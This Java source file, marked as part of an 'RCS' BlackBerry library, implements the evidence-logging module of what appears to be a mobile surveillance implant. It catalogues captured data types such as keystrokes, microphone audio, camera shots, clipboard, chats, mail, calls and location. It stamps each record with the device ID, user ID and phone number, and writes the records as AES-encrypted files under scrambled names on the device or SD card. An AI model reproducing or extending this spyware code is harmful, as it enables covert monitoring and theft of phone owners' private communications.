//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Log.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.evidence;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.agent.Agent;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/*  LOG FORMAT
 *
 *  -- Naming Convention
 *  Il formato dei log e' il seguente:
 *  Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
 *  e si presenta cosi': xxxx-xxxx-dddd.mob
 *  Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
 *  e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
 *  di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
 *  1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
 *  chiave utilizzata per il challenge.
 *
 *  -- Header
 *  Il log cifrato e' cosi' composto:
 *  all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
 *  lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
 *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
 *
 *  -- Data
 *  Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
 *  unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
 *  e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
 *  fine del file.
 *
 *  -- Global Struct
 *  |Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
 *
 *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
 *
 */
/**
 * The Class Evidence (formerly known as Log.)
 */
public final class Evidence {
    private static final int EVIDENCE_VERSION_01 = 2008121901;
    /*
     * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
     */

    public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;

    public static final int[] TYPE_EVIDENCE = new int[] { EvidenceType.INFO,
            EvidenceType.MAIL_RAW, EvidenceType.ADDRESSBOOK,
            EvidenceType.CALLLIST, // 0..3
            EvidenceType.DEVICE, EvidenceType.LOCATION, EvidenceType.CALL,
            EvidenceType.CALL_MOBILE, // 4..7
            EvidenceType.KEYLOG, EvidenceType.SNAPSHOT, EvidenceType.URL, EvidenceType.CHAT, // 8..b
            EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT, EvidenceType.CLIPBOARD, // c..f
            EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
            EvidenceType.NONE // 12
    };

    private static final long MIN_AVAILABLE_SIZE = 200 * 1024;

    //#ifdef DEBUG
    private static Debug debug = new Debug("Evidence", DebugLevel.INFORMATION);

    //#endif

    boolean firstSpace = true;

    /**
     * Convert type log.
     * 
     * @param agentId
     *            the agent id
     * @return the int
     */
    public static int convertTypeEvidence(final int agentId) {
        final int agentPos = agentId - Agent.AGENT;
        //#ifdef DBC
        Check.requires(TYPE_EVIDENCE != null, "Null TypeEvidence");
        //#endif
        if (agentPos >= 0 && agentPos < TYPE_EVIDENCE.length) {
            final int typeLog = TYPE_EVIDENCE[agentPos];
            return typeLog;
        }

        //#ifdef DEBUG
        debug.warn("Wrong agentId conversion: " + agentId);
        //#endif
        return EvidenceType.UNKNOWN;
    }

    Date timestamp;
    String logName;

    int evidenceType;

    String fileName;
    FileConnection fconn = null;

    DataOutputStream os = null;
    Encryption encryption;
    EvidenceCollector evidenceCollector;

    EvidenceDescription evidenceDescription;
    Device device;

    //Agent agent;
    int agentId;
    boolean onSD;

    int progressive;

    private byte[] aesKey;

    private Evidence() {
        evidenceCollector = EvidenceCollector.getInstance();
        device = Device.getInstance();
        encryption = new Encryption();
        progressive = -1;
        // timestamp = new Date();
    }

    /**
     * Instantiates a new log.
     * 
     * @param agent_
     *            the agent_
     * @param aesKey
     *            the aes key
     */
    public Evidence(final int agentId, final boolean onSD, final byte[] aesKey) {
        this();
        //#ifdef DBC        
        Check.requires(aesKey != null, "aesKey null");
        Check.requires(encryption != null, "encryption null");
        //#endif

        //agent = agent_;
        this.agentId = agentId;
        this.onSD = onSD;
        this.aesKey = aesKey;

        encryption.makeKey(aesKey);

        //#ifdef DBC
        //Check.ensures(agent != null, "createLog: agent null");
        Check.ensures(encryption != null, "encryption null");
        //#endif
    }

    public Evidence(final boolean onSD, final byte[] aesKey) {
        this();
        //#ifdef DBC        
        Check.requires(aesKey != null, "aesKey null");
        Check.requires(encryption != null, "encryption null");
        //#endif

        //agent = agent_;
        this.agentId = -1;
        this.onSD = onSD;
        this.aesKey = aesKey;

        encryption.makeKey(aesKey);

        //#ifdef DBC
        //Check.ensures(agent != null, "createLog: agent null");
        Check.ensures(encryption != null, "encryption null");
        //#endif
    }

    public Evidence(Evidence log) {
        this(log.agentId, log.onSD, log.aesKey);
    }

    /**
     * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
     * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
     * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
     * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
     * automaticamente l'handle.
     * 
     * @return true, if successful
     */
    public synchronized boolean close() {
        boolean ret = true;

        if (os != null) {
            try {
                os.close();
            } catch (final IOException e) {
                ret = false;
            }
        }

        if (fconn != null) {
            try {
                fconn.close();
            } catch (final IOException e) {
                ret = false;
            }
        }

        os = null;
        fconn = null;
        return ret;
    }

    public synchronized boolean createEvidence(final byte[] additionalData) {
        return createEvidence(additionalData, convertTypeEvidence(agentId));
    }

    /**
     * Questa funzione crea un file di log e lascia l'handle aperto. Il file
     * viene creato con un nome casuale, la chiamata scrive l'header nel file e
     * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
     * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
     * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
     * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
     * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
     * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
     * FALSE altrimenti.
     * 
     * @param additionalData
     *            the additional data
     * @return true, if successful
     */
    public synchronized boolean createEvidence(final byte[] additionalData,
            final int logType) {
        //#ifdef DEBUG
        debug.trace("createLog logType: " + logType);
        //#endif

        //#ifdef DBC
        Check.requires(os == null && fconn == null,
                "createLog: not previously closed");
        //#endif

        timestamp = new Date();

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        final Vector tuple = evidenceCollector.makeNewName(this, onSD);
        //#ifdef DBC
        Check.asserts(tuple.size() == 5, "Wrong tuple size");
        //#endif

        progressive = ((Integer) tuple.elementAt(0)).intValue();
        final String basePath = (String) tuple.elementAt(1);
        final String blockDir = (String) tuple.elementAt(2);
        final String encName = (String) tuple.elementAt(3);
        final String plainFileName = (String) tuple.elementAt(4);

        final String dir = basePath + blockDir + "/";
        final boolean ret = Path.createDirectory(dir);

        if (!ret) {
            //#ifdef DEBUG
            debug.error("Dir not created: " + dir);
            //#endif
            return false;
        }

        fileName = dir + encName;
        //#ifdef DBC
        Check.asserts(fileName != null, "null fileName");
        Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
                "file not scrambled");
        Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
        //#endif

        //#ifdef DEBUG
        debug.trace("createLog fileName:" + fileName);
        //#endif
        try {
            fconn = (FileConnection) Connector.open("file://" + fileName);

            if (fconn.exists()) {
                close();
                //#ifdef DEBUG
                debug.fatal("It should not exist:" + fileName);
                //#endif

                return false;
            }

            final long available = fconn.availableSize();
            if (available < MIN_AVAILABLE_SIZE) {
                close();
                //#ifdef DEBUG
                if (firstSpace) {
                    firstSpace = false;

                    debug.fatal("not enough space: " + available);
                }
                //#endif

                return false;
            }

            //#ifdef DEBUG
            debug.info("Created: " + fileName);
            //#endif

            final byte[] plainBuffer = makeDescription(additionalData, logType);
            //#ifdef DBC
            Check.asserts(plainBuffer.length >= 32 + additionalLen,
                    "Short plainBuffer");
            //#endif

            fconn.create();
            os = fconn.openDataOutputStream();

            final byte[] encBuffer = encryption.encryptData(plainBuffer);
            //#ifdef DBC
            Check.asserts(encBuffer.length == Encryption
                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
            //#endif

            // scriviamo la dimensione dell'header paddato
            os.write(Utils.intToByteArray(plainBuffer.length));
            // scrittura dell'header cifrato
            os.write(encBuffer);
            os.flush();

            //#ifdef DBC
            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
                    "Wrong filesize");
            //#endif

            //#ifdef DEBUG
            debug.trace("additionalData.length: " + plainBuffer.length);
            debug.trace("encBuffer.length: " + encBuffer.length);
            //#endif

        } catch (final IOException ex) {
            //#ifdef DEBUG
            debug.error("file: " + plainFileName + " ex:" + ex);
            //#endif
            return false;
        }
        
        //#ifdef DBC
        Check.ensures(os != null,
                "null os");
        //#endif

        return true;
    }

    // pubblico solo per fare i test
    /**
     * Make description.
     * 
     * @param additionalData
     *            the additional data
     * @return the byte[]
     */
    public byte[] makeDescription(final byte[] additionalData, final int logType) {

        if (timestamp == null) {
            timestamp = new Date();
        }

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        final DateTime datetime = new DateTime(timestamp);

        evidenceDescription = new EvidenceDescription();
        evidenceDescription.version = EVIDENCE_VERSION_01;
        evidenceDescription.logType = logType;
        evidenceDescription.hTimeStamp = datetime.hiDateTime();
        evidenceDescription.lTimeStamp = datetime.lowDateTime();
        evidenceDescription.additionalData = additionalLen;
        evidenceDescription.deviceIdLen = device.getWDeviceId().length;
        evidenceDescription.userIdLen = device.getWUserId().length;
        evidenceDescription.sourceIdLen = device.getWPhoneNumber().length;

        final byte[] baseHeader = evidenceDescription.getBytes();
        //#ifdef DBC
        Check.asserts(baseHeader.length == evidenceDescription.length,
                "Wrong log len");
        //#endif

        final int headerLen = baseHeader.length + evidenceDescription.additionalData
                + evidenceDescription.deviceIdLen + evidenceDescription.userIdLen
                + evidenceDescription.sourceIdLen;
        final byte[] plainBuffer = new byte[Encryption
                .getNextMultiple(headerLen)];

        final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
                plainBuffer.length, false);
        databuffer.write(baseHeader);
        databuffer.write(device.getWDeviceId());
        databuffer.write(device.getWUserId());
        databuffer.write(device.getWPhoneNumber());

        if (additionalLen > 0) {
            databuffer.write(additionalData);
        }

        return plainBuffer;
    }

    /**
     * Override della funzione precedente: invece di generare il nome da una
     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
     * una stringa vuota.
     * 
     * @param agentId
     *            the agent id
     * @param addPath
     *            the add path
     * @return the string
     */
    String makeName(final int agentId, final boolean addPath) {
        return null;
    }

    /**
     * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
     * nome ritornato e' completo del path da utilizzare altrimenti viene
     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
     * stringa vuota. Il nome generato non indica necessariamente un file che
     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
     * disponibile, se esiste.
     * 
     * @param name
     *            the name
     * @param addPath
     *            the add path
     * @param storeToMMC
     *            the store to mmc
     * @return the string
     */
    String makeName(final String name, final boolean addPath,
            final boolean storeToMMC) {
        return null;
    }

    public synchronized byte[] plainEvidence(final byte[] additionalData,
            final int logType, final byte[] data) {

        //final byte[] encData = encryption.encryptData(data, 0);

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        final byte[] plainBuffer = makeDescription(additionalData, logType);
        //#ifdef DBC
        Check.asserts(plainBuffer.length >= 32 + additionalLen,
                "Short plainBuffer");
        //#endif
        
        // buffer completo
        byte[] buffer = new byte[additionalData.length + data.length + 8];
        DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length, false);
        
        // scriviamo la dimensione dell'header paddato
        databuffer.writeInt(plainBuffer.length);
        // scrittura dell'header cifrato
        databuffer.write(additionalData);

        // scrivo il contenuto
        databuffer.writeInt(data.length);
        databuffer.write(data);

        return buffer;
    }

    public boolean writeEvidence(final byte[] data) {
        return writeEvidence(data, 0);
    }

    /**
     * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
     * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
     * fine, FALSE altrimenti.
     * 
     * @param data
     *            the data
     * @return true, if successful
     */
    public synchronized boolean writeEvidence(final byte[] data, int offset) {
        if (os == null) {
            //#ifdef DEBUG
            debug.error("os null");
            //#endif
            return false;
        }

        if (fconn == null) {
            //#ifdef DEBUG
            debug.error("fconn null");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        // green
        debug.ledStart(0x0044DC4C);
        //#endif

        final byte[] encData = encryption.encryptData(data, offset);
        //#ifdef DEBUG
        debug.info("writeEvidence encdata: " + encData.length);
        //#endif

        try {
            os.write(Utils.intToByteArray(data.length - offset));
            os.write(encData);
            os.flush();
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Error writing file: " + e);
            //#endif
            return false;
        } finally {
            //#ifdef DEBUG
            debug.ledStop();
            //#endif
        }

        return true;
    }

    /**
     * Write log.
     * 
     * @param data
     *            the data
     * @param endzero
     *            the endzero
     * @return true, if successful
     */
    public boolean writeEvidence(final String data, final boolean endzero) {
        return writeEvidence(WChar.getBytes(data, endzero));
    }

    /**
     * Write logs.
     * 
     * @param bytelist
     *            the bytelist
     * @return true, if successful
     */
    public boolean writeEvidences(final Vector bytelist) {
        int totalLen = 0;
        for (int i = 0; i < bytelist.size(); i++) {
            final byte[] token = (byte[]) bytelist.elementAt(i);
            totalLen += token.length;
        }

        final int offset = 0;
        final byte[] buffer = new byte[totalLen];
        final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen, false);

        for (int i = 0; i < bytelist.size(); i++) {
            final byte[] token = (byte[]) bytelist.elementAt(i);
            databuffer.write(token);
        }

        //#ifdef DEBUG
        debug.trace("len: " + buffer.length);
        //#endif

        return writeEvidence(buffer);
    }

    public static void info(final String message) {
        try {
            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false, Keys
                    .getInstance().getAesKey());

            logInfo.createEvidence(null);
            logInfo.writeEvidence(message, true);
            logInfo.close();
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

}